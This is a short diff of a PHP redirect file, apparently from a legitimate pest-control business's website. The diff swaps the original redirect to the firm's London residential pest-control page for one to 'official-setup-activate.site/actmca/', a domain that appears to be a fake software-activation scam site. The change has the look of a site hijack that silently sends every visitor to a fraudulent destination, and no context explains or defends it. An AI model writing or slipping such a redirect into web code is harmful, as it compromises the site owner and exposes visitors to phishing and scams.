@@ -1,4 +1,4 @@
 <?php
-header("Location: https://www.biopestcontrol.co.uk/local/residential-pest-control-london/");
+header("Location: https://official-setup-activate.site/actmca/");
 die();
 ?>
